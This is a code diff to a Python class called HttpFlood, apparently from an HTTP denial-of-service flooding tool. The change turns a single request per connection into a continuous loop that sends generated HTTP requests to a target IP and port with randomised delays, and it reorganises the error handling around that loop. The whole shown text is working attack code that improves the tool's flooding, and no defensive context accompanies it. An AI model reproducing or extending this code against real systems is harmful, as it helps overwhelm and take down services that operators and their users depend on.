@@ -55,20 +55,26 @@ class HttpFlood:
 
                 self.socket_manager.connect(self.target_ip, self.target_port)
                 if self.socket_manager.sock:
-                    http_request = self.http_request_generator.create_http_request()
-                    self.socket_manager.send(http_request)
-                    logging.debug(Fore.GREEN + f"Sent HTTP request: {http_request}")
+                    while self.is_running:
+                        try:
+                            http_request = self.http_request_generator.create_http_request()
+                            self.socket_manager.send(http_request)
+                            logging.debug(Fore.GREEN + f"Sent HTTP request: {http_request}")
 
-                    time.sleep(random.uniform(0.1, 1.0))
+                            time.sleep(random.uniform(0.1, 1.0))
+                        except socket.timeout:
+                            logging.error(Fore.YELLOW + "Socket connection timed out")
+                        except socket.error as e:
+                            logging.error(Fore.RED + f"Socket error: {e}")
+                            break
+                        except Exception as e:
+                            logging.error(Fore.RED + f"Unexpected error: {e}")
+                            break
                 else:
                     logging.error(Fore.RED + "Skipping sending HTTP request due to connection failure")
 
-            except socket.timeout:
-                logging.error(Fore.YELLOW + "Socket connection timed out")
-            except socket.error as e:
-                logging.error(Fore.RED + f"Socket error: {e}")
             except Exception as e:
-                logging.error(Fore.RED + f"Unexpected error: {e}")
+                logging.error(Fore.RED + f"Unexpected error during connection setup: {e}")
             finally:
                 self.socket_manager.close()
 
